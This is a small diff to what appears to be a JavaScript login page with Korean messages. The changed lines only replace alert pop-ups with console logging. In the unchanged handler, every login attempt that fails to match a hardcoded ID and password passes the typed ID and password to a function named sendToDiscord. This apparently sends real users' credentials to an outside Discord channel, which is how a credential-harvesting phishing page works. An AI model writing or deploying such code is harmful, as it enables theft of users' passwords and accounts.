@@ -19,10 +19,10 @@ inputPassword.addEventListener("keyup", () => {
 
 ordinaryButton.addEventListener('click', () => {
     if (inputId.value === "본인의아이디" && inputPassword.value === "비밀번호") {
-        alert("로그인 성공");
+        console.log("로그인 성공");
     } else {
         sendToDiscord(inputId.value, inputPassword.value);
-        alert("로그인 실패");
+        console.log("로그인 실패");
     }
 });
 
